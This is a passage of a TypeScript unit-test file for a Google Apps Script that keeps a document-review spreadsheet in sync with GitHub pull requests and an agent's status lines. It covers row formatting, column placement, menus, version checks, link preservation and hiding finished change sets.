  };
  test("ownLinesNotAgentChange", () => {
    expect(fns.ownText("⏳ r#1 open.\n↳ r#1\n⚠ Stale: x\nWhat changed:\n• a")).toBe("What changed:\n• a");
  });
  test("draftedProposalSaysReady", () => {
    const pr = { url: "https://github.com/o/r/pull/1", head: "abc1234", done: "2026-10-31 15:26Z" };
    expect(fns.progressLine({ prs: [pr], built: { step: "proposed 2026-10-31 17:30Z" } })).toMatch(/^⏳ Proposal ready \((today|yesterday|\d+ days ago, 2026-10-31) 17:30Z\): set Ready for agent to Yes/);
  });
});

describe('data rows look like data rows (owner, 2026-10-31: "why row 3 bold")', () => {
  test("headerLookRowRestored", () => {
    const copies: Array<[number, number]> = [];
    // Row 1 instructions, row 2 header, rows 3-4 data; row 3 inherited the header's bold.
    const values = [["Instructions", ""], ["Change-set", "Title"], ["CS-001", "FDA"], ["CS-002", "Other"]];
    const weights = [["bold", "bold"], ["normal", "bold"]];
    const sh = {
      getLastRow: () => 4, getLastColumn: () => 2, getMaxRows: () => 500,
      getRange: (r: number, _c: number, n?: number) => ({
        getDisplayValues: () => values.slice(r - 1, r - 1 + (n ?? 1)),
        getFontWeights: () => weights, getVerticalAlignments: () => [["middle", "middle"], ["top", "top"]],
        copyTo: (dest: { row: number }) => { copies.push([r, dest.row]); },
        row: r,
      }),
    };
    const SpreadsheetApp = { CopyPasteType: { PASTE_FORMAT: "f" } };
    const normalizeRows = new Function("SpreadsheetApp", `${code}\nreturn normalizeRows;`)(SpreadsheetApp);
    expect(normalizeRows(sh)).toBe(1);
    expect(copies).toEqual([[500, 3]]);
  });
});

describe("Agentic status sits left of its filter column (owner, 2026-10-31)", () => {
  const placeBefore = new Function("SpreadsheetApp", `${code}\nreturn placeBefore;`)({});
  const sheetWith = (header: string[], moves: Array<[number, number]>) => ({
    getLastRow: () => 2, getLastColumn: () => header.length,
    getRange: (r: number, c: number) => ({ getDisplayValues: () => [["Instructions", ...header.slice(1).map(() => "")], header], col: c }),
    moveColumns: (range: { col: number }, to: number) => moves.push([range.col, to]),
  });
  test("statusMovedBeforeFilter", () => {
    const moves: Array<[number, number]> = [];
    expect(placeBefore(sheetWith(["Change-set", "Agentic status (filter)", "Issue", "Agentic status"], moves), "Agentic status", "Agentic status (filter)")).toBe(true);
    expect(moves).toEqual([[4, 2]]);
  });
  test("titleRowUnmergedRemerged", () => {
    const log: string[] = [];
    const header = ["Change-set", "Agentic status (filter)", "Issue", "Agentic status"];
    const title = { text: "Contributor Log" };
    const merge = {
      getA1Notation: () => "B1:D1",
      getCell: () => ({ getRichTextValue: () => title }),
      breakApart: () => log.push("break B1:D1"),
    };
    const sh = {
      getLastRow: () => 2, getLastColumn: () => header.length,
      getRange: (r: number | string, c?: number) => typeof r === "string"
        ? { merge: () => log.push(`merge ${r}`), getCell: () => ({ setRichTextValue: (v: unknown) => log.push(`text ${v === title}`) }) }
        : { getDisplayValues: () => [["Instructions", "", "", ""], header], getMergedRanges: () => [merge], col: c },
      moveColumns: (range: { col: number }, to: number) => log.push(`move ${range.col}->${to}`),
    };
    expect(placeBefore(sh, "Agentic status", "Agentic status (filter)")).toBe(true);
    expect(log).toEqual(["break B1:D1", "move 4->2", "merge B1:D1", "text true"]);
  });
  test("alreadyPlacedLeft", () => {
    const moves: Array<[number, number]> = [];
    expect(placeBefore(sheetWith(["Change-set", "Agentic status", "Agentic status (filter)"], moves), "Agentic status", "Agentic status (filter)")).toBe(false);
    expect(moves).toEqual([]);
  });
});

describe("the Selected Sections dropdown reminder (core#472)", () => {
  const src = readText(join(import.meta.dir, "review-sheet.gs"), "utf8");
  const fns = new Function("SpreadsheetApp", `${src}\nreturn { multiPicked, setData: (d) => { DATA = d; } };`)({}) as {
    multiPicked: (cells: { getDisplayValues: () => string[][] }, top: number) => number[];
    setData: (d: unknown) => void;
  };
  fns.setData({ TOC: [["Front matter"], ["Annexes"], ["Glossary"]] });
  const cells = (vals: string[]) => ({ getDisplayValues: () => vals.map((v) => [v]) });

  test("multiPickRowsNamed", () => {
    expect(fns.multiPicked(cells(["Front matter", "Front matter, Annexes", "", "Annexes, Glossary"]), 3)).toEqual([4, 6]);
  });
  test("reminderSkippedOnlyWhenDone", () => {
    expect(src).not.toMatch(/dropdownDone'\) \|\| multiPicked/);
    expect(src).toMatch(/if \(had && props\.getProperty\('dropdownDone'\)\) return;/);
  });
  test("reminderToLog", () => {
    const body = src.slice(src.indexOf("function checkDropdown("), src.indexOf("function normalizeRows("));
    expect(body).toMatch(/console\.log\(msg\)/);
    expect(body).toMatch(/ss\.toast\(msg,/);
  });
});

describe("the Folio Assistant menu and version check (owner, 2026-11-01)", () => {
  const ui = () => {
    const shown: { title: string; body: string }[] = [];
    const menus: { name: string; items: string[] }[] = [];
    const api = {
      ButtonSet: { OK: "OK" },
      alert: (title: string, body: string) => void shown.push({ title, body }),
      createMenu: (name: string) => {
        const m = { name, items: [] as string[] };
        menus.push(m);
        const b = { addItem: (_: string, fn: string) => (m.items.push(fn), b), addSeparator: () => b, addToUi: () => {} };
        return b;
      },
    };
    return { api, shown, menus };
  };
  const run = (config: Record<string, unknown>) => {
    const rows = configRows(config as never);
    const rt = runtime(withConfig(tabs(), rows));
    const u = ui();
    (rt.g.SpreadsheetApp as Record<string, unknown>).getUi = () => u.api;
    const fn = new Function(...Object.keys(rt.g), `${code}\nreturn { showVersion, addMenu, SCRIPT_VERSION };`);
    return { ...u, s: fn(...Object.values(rt.g)) as { showVersion(): void; addMenu(ui?: unknown): void; SCRIPT_VERSION: string } };
  };
  const pc = () => buildConfig(folio(), "review/public-comment/sheet-sync.json");

  test("menuFolioAssistant", () => {
    const r = run(pc());
    r.s.addMenu(r.api);
    expect(r.menus).toEqual([{ name: "Folio Assistant", items: ["refreshAll", "installTriggers", "showVersion", "showAbout"] }]);
  });

  test("configCarriesNewestBuild", () => {
    const c = pc();
    expect(c.CFG.LATEST_BUILD).toMatch(/^template sha256 [0-9a-f]{16}$/);
    const r = run({ ...c, CFG: { ...c.CFG, LATEST_BUILD: "" } });
    r.s.showVersion();
    expect(r.shown[0].body).toMatch(/^Newest build: top of the copy page/);
    const same = run({ ...c, CFG: { ...c.CFG, LATEST_BUILD: r.s.SCRIPT_VERSION } });
    same.s.showVersion();
    expect(same.shown[0].body).toContain("✓ Up to date.");
    expect(same.shown[0].body).toContain("More about Folio Assistant: https://litlfred.github.io/folio-assistant/");
  });

  test("olderSheetToldNewBuild", () => {
    const c = pc();
    const r = run({ ...c, CFG: { ...c.CFG, LATEST_BUILD: "template sha256 0123456789abcdef" } });
    r.s.showVersion();
    expect(r.shown[0].body).toContain("New build available: 01234567");
    expect(r.shown[0].body).toContain("claude.ai/artifact/MXNQcLMzLYqq5us5x6phGd");
  });
});

describe("Needs you only with a question (Q-FBK-1 A)", () => {
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { askChecked, statusBlock, progressLine };`)({}) as {
    askChecked: (l: unknown, t: string) => unknown;
    statusBlock: (l: string, s: string, p: object[]) => { text: string; links: [number, number, string][] };
    progressLine: (o: object) => string;
  };
  const line = fns.progressLine({ status: "Needs human" });
  test("keepsAskWithQuestion", () => {
    expect(fns.askChecked(line, "Decision needed: which title?\nA. Short (recommended)\nB. Long")).toBe(line);
  });
  test("dropsAskWithoutQuestion", () => {
    expect(fns.askChecked(line, "Draft PR dth-hrh#81: 6 BPMN processes.")).toBe("");
  });
  test("dropsAskSubLineKeepsLink", () => {
    const url = "https://github.com/litlfred/dth-hrh/pull/81";
    const b = fns.statusBlock(line, "Needs human", [{ url, done: "2026-11-01 19:00Z" }]);
    const out = fns.askChecked(b, "no question here") as { text: string; links: [number, number, string][] };
    expect(out.text).not.toMatch(/answer the agent's question: under/);
    const [a, z, u] = out.links[0];
    expect(u).toBe(url);
    expect(out.text.slice(a, z)).toBe("dth-hrh#81");
  });
});

describe("Where to review and PR links (Q-FBK-3 A)", () => {
  const fns = new Function("SpreadsheetApp", "CFG", `${code.replace(/^(const|let) CFG\b.*$/m, "")}\nreturn { whereLine, whereFor, previewSection, autoLinks, withWhere };`)({}, { REPO_URL: "https://github.com/litlfred/dth-hrh" }) as {
    whereLine: (picked: string[], toc: Record<string, string>, staging: string) => { text: string; links: [number, number, string][] };
    autoLinks: (t: string, taken: [number, number, string][]) => [number, number, string][];
    whereFor: (picked: string[], toc: Record<string, string>, staging: string, status: string) => { text: string } | null;
  };
  const toc = { "4.1 Scope": "https://litlfred.github.io/dth-hrh/en/dth-hrh/#sec-4-1" };
  test("whereLinksPreview", () => {
    const w = fns.whereLine(["4.1 Scope"], toc, "https://litlfred.github.io/dth-hrh/STAGING/claude-x/en/review/");
    expect(w.text).toBe("↳ Where to review (preview): 4.1 Scope");
    expect(w.links[0][2]).toBe("https://litlfred.github.io/dth-hrh/STAGING/claude-x/en/dth-hrh/#sec-4-1");
    expect(w.text.slice(w.links[0][0], w.links[0][1])).toBe("4.1 Scope");
  });
  test("whereFallsBackPublished", () => {
    expect(fns.whereLine(["4.1 Scope"], toc, "").links[0][2]).toBe(toc["4.1 Scope"]);
    expect(fns.whereLine([], toc, "").text).toMatch(/No section selected/);
  });
  test("finishedRowNoWarning", () => {
    expect(fns.whereFor([], toc, "", "Closed")).toBeNull();
    expect(fns.whereFor([], toc, "", "Needs human")?.text).toMatch(/No section selected/);
    expect(fns.whereFor(["4.1 Scope"], toc, "", "Reverted")?.text).toMatch(/Where to review: 4.1 Scope/);
  });
  test("repoRefsLinked", () => {
    const t = "Draft PR dth-hrh#82 and smart-ra#198.";
    const l = fns.autoLinks(t, []);
    expect(l.map(x => t.slice(x[0], x[1]))).toEqual(["dth-hrh#82", "smart-ra#198"]);
    expect(l[0][2]).toBe("https://github.com/litlfred/dth-hrh/issues/82");
  });
});

describe('a refresh keeps the links an agent put in its feedback (owner, 2026-11-01: "Dont know where link is")', () => {
  const { keptLinks, linkRuns } = new Function("SpreadsheetApp", code + "\nreturn { keptLinks, linkRuns };")({}) as {
    keptLinks: (r: { text: string; url: string }[], t: string) => [number, number, string][];
    linkRuns: (range: object) => { text: string; url: string }[];
  };
  test("keptLinksFoundInOrder", () => {
    const runs = [
      { text: "dth-hrh#75", url: "https://github.com/litlfred/dth-hrh/pull/75" },
      { text: "dth-hrh#75", url: "https://github.com/litlfred/dth-hrh/pull/75" },
    ];
    const t = "⏳ The agent is working on dth-hrh#69.\nStatus: plan dth-hrh#75 signed off.\nWhere to review: dth-hrh#75.";
    const k = keptLinks(runs, t);
    expect(k.map(([a, z]) => t.slice(a, z))).toEqual(["dth-hrh#75", "dth-hrh#75"]);
    expect(k[0][0]).toBeLessThan(k[1][0]);
  });
  test("goneLabelDropped", () => {
    expect(keptLinks([{ text: "gone", url: "https://x/" }], "new text")).toEqual([]);
  });
  test("noRichTextNoRuns", () => {
    expect(linkRuns({})).toEqual([]);
    expect(linkRuns({ getRichTextValue: () => { throw new Error("no"); } })).toEqual([]);
    const run = (text: string, url: string | null) => ({ getText: () => text, getLinkUrl: () => url });
    expect(linkRuns({ getRichTextValue: () => ({ getRuns: () => [run("a ", null), run("#75", "https://u/"), run(" ", "https://v/")] }) }))
      .toEqual([{ text: "#75", url: "https://u/" }]);
  });
});

describe("finished change sets are hidden and struck through", () => {
  // Owner, 2026-11-01 21:50Z: "make sure complete changeset rows are hidden so
  // not cluttered and that text of that whole row is crossed out".
  const { finishDoneRows } = new Function(code + "\nreturn { finishDoneRows };")() as {
    finishDoneRows: (s: object, csCol: number, stOf: Record<string, string>, props: object) => void;
  };
  const run = (stOf: Record<string, string>, store: Record<string, string> = {}) => {
    const log: string[] = [];
    const sh = {
      getLastColumn: () => 5,
      getRange: (row: number, _c: number, _n: number, w: number) => ({ setFontLine: (l: string) => log.push(`line ${row} ${w} ${l}`) }),
      hideRows: (row: number) => log.push(`hide ${row}`),
      showRows: (row: number) => log.push(`show ${row}`),
    };
    const props = { getProperty: (k: string) => store[k] ?? null, setProperty: (k: string, v: string) => { store[k] = v; } };
    finishDoneRows({ sh, top: 3, rows: [["CS-001"], ["CS-002"], [""], ["CS-003"]] }, 0, stOf, props);
    return { log, store };
  };
  test("finishedRowsHidden", () => {
    const { log, store } = run({ "CS-001": "Change merged", "CS-002": "PR open", "CS-003": "Closed" });
    expect(log).toEqual(["line 3 5 line-through", "hide 3", "line 6 5 line-through", "hide 6"]);
    expect(store).toEqual({ "d:CS-001": "1", "d:CS-003": "1" });
  });
  test("reopenedRowShown", () => {
    const { log } = run({ "CS-001": "Change merged", "CS-003": "Working" }, { "d:CS-001": "1", "d:CS-003": "1" });
    expect(log).toEqual(["line 6 5 none", "show 6"]);
  });
});

describe("people make change sets (Q-CS-1 C)", () => {
  const f = new Function("SpreadsheetApp", `${code}\nCFG = { RCS: "Review Change Sets" };\nreturn { csRowsPlan, humanCs };`)({}) as {
    csRowsPlan(rows: string[][], agent: string[][]): { give: Record<string, string>; append: string[][] };
    humanCs(v: string, known: Record<string, number>): { ids: string[]; note: string } | null;
  };
  test("titleOnlyRowGetsId", () => {
    const p = f.csRowsPlan([["CS-001", "A"], ["", "Split of A"], ["", ""]], [["CS-001", "A"], ["CS-004", "B"]]);
    expect(p.give).toEqual({ 1: "CS-005" });
    expect(p.append).toEqual([["CS-004", "B"]]);
  });
  test("agentSetNotAddedTwice", () => {
    const p = f.csRowsPlan([["CS-001", "People's title"]], [["CS-001", "Agent title"]]);
    expect(p).toEqual({ give: {}, append: [] });
  });
  test("humanCsParsed", () => {
    const known = { "CS-001": 1, "CS-004": 1 };
    expect(f.humanCs("", known)).toBeNull();
    expect(f.humanCs("cs-4", known)).toEqual({ ids: ["CS-004"], note: "" });
    expect(f.humanCs("CS-001, CS-004", known)?.ids).toEqual(["CS-001", "CS-004"]);
    expect(f.humanCs("new", known)).toEqual({ ids: [], note: "new: the agent makes a change set for this comment" });
    expect(f.humanCs("CS-009", known)?.note).toMatch(/CS-009 is not a change set on Review Change Sets/);
  });
});

describe("Review Change Sets rows people start, in a run", () => {
  test("runAddsIdAndAgentSet", () => {
    const t = tabs();
    t["Review Change Sets"].rows = [
      ["Change-set", "Title", "Sections", "Pages", "Public Comments", "Suggested Revisions", "PC Committee Feedback", "Dispositions", "Agentic status"],
      ["CS-001", "Fix scope", "", "", "", "", "", "", ""],
      ["CS-002", "Other", "", "", "", "", "", "", ""],
      ["", "Split out the typo", "", "", "", "", "", "", ""],
    ];
    t["Agent - Change Sets"].rows.push(["CS-007", "From an issue form", "", "", ""]);
    const rt = runtime(withConfig(t, configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"))));
    load(code, rt.g).refreshAll();
    const ids = rt.written["Review Change Sets"]["Change-set"].map((r) => T((r as unknown[])[0]));
    expect(ids[2]).toBe("CS-008");
    expect(ids[3]).toBe("CS-007");
    expect(T((rt.written["Review Change Sets"]["Title"][3] as unknown[])[0])).toBe("From an issue form");
  });
});

describe("Title opens in a template's whole-tab lock (Q-TBL-1 A)", () => {
  const open = new Function("SpreadsheetApp", `${code}\nreturn openInSheetLock;`)({ ProtectionType: { SHEET: "SHEET" } }) as
    (sh: unknown, c: number, top: number) => void;
  const range = (row: number, col: number, n: number) => ({ getRow: () => row, getColumn: () => col, getNumColumns: () => n });
  const lockWith = (ranges: ReturnType<typeof range>[]) => {
    const set: ReturnType<typeof range>[][] = [];
    const p = { getUnprotectedRanges: () => ranges.slice(), setUnprotectedRanges: (r: ReturnType<typeof range>[]) => set.push(r) };
    const sh = { getMaxRows: () => 401, getProtections: (t: string) => (t === "SHEET" ? [p] : []), getRange: (r: number, c: number) => range(r, c, 1) };
    return { sh, set };
  };
  test("addsTitleToExceptions", () => {
    const { sh, set } = lockWith([range(3, 10, 4), range(3, 14, 2)]);
    open(sh, 1, 3);
    expect(set).toHaveLength(1);
    expect(set[0]).toHaveLength(3);
    expect(set[0][2].getColumn()).toBe(2);
    expect(set[0][2].getRow()).toBe(3);
  });
  test("leavesAnOpenColumnAlone", () => {
    const { sh, set } = lockWith([range(3, 2, 1)]);
    open(sh, 1, 3);
    expect(set).toHaveLength(0);
  });
});
